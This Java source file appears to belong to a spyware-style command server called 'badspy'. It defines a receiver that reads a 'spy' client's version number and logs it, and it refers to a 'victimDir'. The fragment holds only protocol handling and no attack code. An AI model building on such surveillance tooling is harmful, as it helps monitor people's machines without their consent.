package com.blogspot.sontx.badspy.badserver.bo.spyworker;

import com.blogspot.sontx.badspy.badserver.bean.Version;
import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
import com.blogspot.sontx.badspy.badserver.bo.Receiver;
import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
import com.blogspot.sontx.jlog.Log;

import java.io.File;
import java.io.IOException;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 21/4/2016.
 */
public class SpyVersionReceiver extends Receiver {
    private final File victimDir;
    private String spyVersion = null;

    public SpyVersionReceiver(SpyReader reader, SpyWriter writer, int dataLength, File victimDir) {
        super(reader, writer, dataLength);
        this.victimDir = victimDir;
    }

    @Override
    public void start() throws IOException {
        byte[] buffer = new byte[dataLength];
        if (reader.read(buffer) == buffer.length) {
            Version version = Version.parse(buffer);
            spyVersion = version.toString();
            Log.i(String.format("Received spy version: %s", spyVersion));
        }
    }

    public String getSpyVersion() {
        return spyVersion;
    }
}
